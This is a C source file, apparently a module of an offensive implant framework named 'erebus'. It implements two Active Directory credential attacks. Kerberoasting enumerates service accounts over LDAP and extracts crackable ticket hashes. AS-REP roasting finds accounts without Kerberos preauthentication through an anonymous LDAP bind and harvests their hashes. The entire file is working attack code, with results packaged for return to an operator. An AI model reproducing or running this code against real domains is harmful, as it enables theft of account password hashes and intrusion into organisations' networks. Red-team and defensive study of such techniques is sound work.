#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winldap.h>

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "erebus/krb5.h"
#include "erebus/mod_util.h"
#include "erebus/modules.h"
#include "erebus/pb_modules.h"

#pragma comment(lib, "wldap32.lib")

#define EREBUS_KR_MAX_SPN 64

int erebus_mod_kerberoast(const uint8_t *config, size_t config_len, uint8_t **out, size_t *out_len) {
    erebus_kerberoast_config cfg;
    if (!erebus_pb_decode_kerberoast_config(config, config_len, &cfg)) return 0;

    if (!cfg.domain[0] || !cfg.target_dc[0] || !cfg.username[0] || !cfg.password[0]) {
        erebus_pb_free_kerberoast_config(&cfg);
        return 0;
    }

    char spn_storage[EREBUS_KR_MAX_SPN][EREBUS_KRB_SPN_MAX];
    char sam_storage[EREBUS_KR_MAX_SPN][EREBUS_KRB_SAM_MAX];
    const char *spn_ptrs[EREBUS_KR_MAX_SPN];
    const char *sam_ptrs[EREBUS_KR_MAX_SPN];
    size_t spn_count = 0;

    if (cfg.target_spn_count > 0) {
        for (size_t i = 0; i < cfg.target_spn_count && i < EREBUS_KR_MAX_SPN; i++) {
            strncpy(spn_storage[i], cfg.target_spns[i], EREBUS_KRB_SPN_MAX - 1);
            spn_storage[i][EREBUS_KRB_SPN_MAX - 1] = '\0';
            sam_storage[i][0] = '\0';
            spn_ptrs[i] = spn_storage[i];
            sam_ptrs[i] = sam_storage[i];
            spn_count++;
        }
    } else {
        LDAP *ld = ldap_init((PCHAR)cfg.target_dc, 389);
        if (!ld) {
            erebus_pb_free_kerberoast_config(&cfg);
            return 0;
        }
        ULONG version = LDAP_VERSION3;
        ldap_set_option(ld, LDAP_OPT_PROTOCOL_VERSION, &version);
        char bind[512];
        snprintf(bind, sizeof(bind), "%s@%s", cfg.username, cfg.domain);
        if (ldap_bind_s(ld, bind, (PCHAR)cfg.password, LDAP_AUTH_SIMPLE) != LDAP_SUCCESS) {
            ldap_unbind(ld);
            erebus_pb_free_kerberoast_config(&cfg);
            return 0;
        }
        char base[512];
        erebus_mod_domain_to_base_dn(cfg.domain, base, sizeof(base));
        char *attrs[] = { "sAMAccountName", "servicePrincipalName", NULL };
        const char *filter =
            "(&(servicePrincipalName=*)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))";
        LDAPMessage *res = NULL;
        if (ldap_search_s(ld, base, LDAP_SCOPE_SUBTREE, (PCHAR)filter, attrs, 0, &res) != LDAP_SUCCESS) {
            ldap_unbind(ld);
            erebus_pb_free_kerberoast_config(&cfg);
            return 0;
        }
        for (LDAPMessage *entry = ldap_first_entry(ld, res);
             entry && spn_count < EREBUS_KR_MAX_SPN;
             entry = ldap_next_entry(ld, entry)) {
            PCHAR *sams = ldap_get_values(ld, entry, "sAMAccountName");
            PCHAR *spns = ldap_get_values(ld, entry, "servicePrincipalName");
            const char *sam = (sams && sams[0]) ? sams[0] : "";
            if (spns) {
                for (int i = 0; spns[i] && spn_count < EREBUS_KR_MAX_SPN; i++) {
                    strncpy(spn_storage[spn_count], spns[i], EREBUS_KRB_SPN_MAX - 1);
                    spn_storage[spn_count][EREBUS_KRB_SPN_MAX - 1] = '\0';
                    strncpy(sam_storage[spn_count], sam, EREBUS_KRB_SAM_MAX - 1);
                    sam_storage[spn_count][EREBUS_KRB_SAM_MAX - 1] = '\0';
                    spn_ptrs[spn_count] = spn_storage[spn_count];
                    sam_ptrs[spn_count] = sam_storage[spn_count];
                    spn_count++;
                }
            }
            if (sams) ldap_value_free(sams);
            if (spns) ldap_value_free(spns);
        }
        ldap_msgfree(res);
        ldap_unbind(ld);
    }

    erebus_krb_hash hashes[EREBUS_KR_MAX_SPN];
    size_t hash_count = 0;
    if (!erebus_krb_kerberoast(cfg.target_dc, cfg.domain, cfg.username, cfg.password,
            spn_ptrs, sam_ptrs, spn_count, hashes, EREBUS_KR_MAX_SPN, &hash_count)) {
        erebus_pb_free_kerberoast_config(&cfg);
        return 0;
    }

    erebus_kerberoast_hash pb_hashes[EREBUS_KR_MAX_SPN];
    for (size_t i = 0; i < hash_count; i++) {
        pb_hashes[i].spn = hashes[i].spn;
        pb_hashes[i].sam = hashes[i].sam;
        pb_hashes[i].hash = hashes[i].hash;
        pb_hashes[i].enc = hashes[i].enc;
    }

    int ok = erebus_pb_encode_kerberoast_result_multi(pb_hashes, hash_count, out, out_len);
    erebus_pb_free_kerberoast_config(&cfg);
    return ok;
}

#define EREBUS_AR_MAX_USER 64

int erebus_mod_asreproast(const uint8_t *config, size_t config_len, uint8_t **out, size_t *out_len) {
    erebus_asreproast_config cfg;
    if (!erebus_pb_decode_asreproast_config(config, config_len, &cfg)) return 0;

    if (!cfg.domain[0] || !cfg.target_dc[0]) {
        erebus_pb_free_asreproast_config(&cfg);
        return 0;
    }

    char user_storage[EREBUS_AR_MAX_USER][EREBUS_KRB_SAM_MAX];
    const char *user_ptrs[EREBUS_AR_MAX_USER];
    size_t user_count = 0;

    if (cfg.target_user_count > 0) {
        for (size_t i = 0; i < cfg.target_user_count && i < EREBUS_AR_MAX_USER; i++) {
            if (!cfg.target_users[i] || !cfg.target_users[i][0]) continue;
            strncpy(user_storage[user_count], cfg.target_users[i], EREBUS_KRB_SAM_MAX - 1);
            user_storage[user_count][EREBUS_KRB_SAM_MAX - 1] = '\0';
            user_ptrs[user_count] = user_storage[user_count];
            user_count++;
        }
    } else {
        /* Enumerate DONT_REQ_PREAUTH (UAC 0x400000) via anonymous/simple LDAP if possible.
         * No credentials in ASREPRoastConfig — try unauthenticated bind. */
        LDAP *ld = ldap_init((PCHAR)cfg.target_dc, 389);
        if (!ld) {
            erebus_pb_free_asreproast_config(&cfg);
            return 0;
        }
        ULONG version = LDAP_VERSION3;
        ldap_set_option(ld, LDAP_OPT_PROTOCOL_VERSION, &version);
        /* Anonymous bind — many labs allow read of UAC; if not, operator must pass target_users. */
        if (ldap_bind_s(ld, NULL, NULL, LDAP_AUTH_SIMPLE) != LDAP_SUCCESS) {
            ldap_unbind(ld);
            erebus_pb_free_asreproast_config(&cfg);
            return 0;
        }
        char base[512];
        erebus_mod_domain_to_base_dn(cfg.domain, base, sizeof(base));
        char *attrs[] = { "sAMAccountName", NULL };
        const char *filter =
            "(&(objectCategory=person)(objectClass=user)"
            "(userAccountControl:1.2.840.113556.1.4.803:=4194304)"
            "(!(userAccountControl:1.2.840.113556.1.4.803:=2)))";
        LDAPMessage *res = NULL;
        if (ldap_search_s(ld, base, LDAP_SCOPE_SUBTREE, (PCHAR)filter, attrs, 0, &res) != LDAP_SUCCESS) {
            ldap_unbind(ld);
            erebus_pb_free_asreproast_config(&cfg);
            return 0;
        }
        for (LDAPMessage *entry = ldap_first_entry(ld, res);
             entry && user_count < EREBUS_AR_MAX_USER;
             entry = ldap_next_entry(ld, entry)) {
            PCHAR *sams = ldap_get_values(ld, entry, "sAMAccountName");
            if (sams && sams[0]) {
                strncpy(user_storage[user_count], sams[0], EREBUS_KRB_SAM_MAX - 1);
                user_storage[user_count][EREBUS_KRB_SAM_MAX - 1] = '\0';
                user_ptrs[user_count] = user_storage[user_count];
                user_count++;
            }
            if (sams) ldap_value_free(sams);
        }
        ldap_msgfree(res);
        ldap_unbind(ld);
    }

    if (user_count == 0) {
        /* Empty result is valid (no roastable users) — not a hard fail. */
        int ok = erebus_pb_encode_asreproast_result_multi(NULL, 0, out, out_len);
        erebus_pb_free_asreproast_config(&cfg);
        return ok;
    }

    erebus_krb_hash hashes[EREBUS_AR_MAX_USER];
    size_t hash_count = 0;
    if (!erebus_krb_asreproast(cfg.target_dc, cfg.domain, user_ptrs, user_count,
            hashes, EREBUS_AR_MAX_USER, &hash_count)) {
        erebus_pb_free_asreproast_config(&cfg);
        return 0;
    }

    erebus_asreproast_hash pb_hashes[EREBUS_AR_MAX_USER];
    for (size_t i = 0; i < hash_count; i++) {
        pb_hashes[i].username = hashes[i].sam;
        pb_hashes[i].hash = hashes[i].hash;
    }

    int ok = erebus_pb_encode_asreproast_result_multi(pb_hashes, hash_count, out, out_len);
    erebus_pb_free_asreproast_config(&cfg);
    return ok;
}
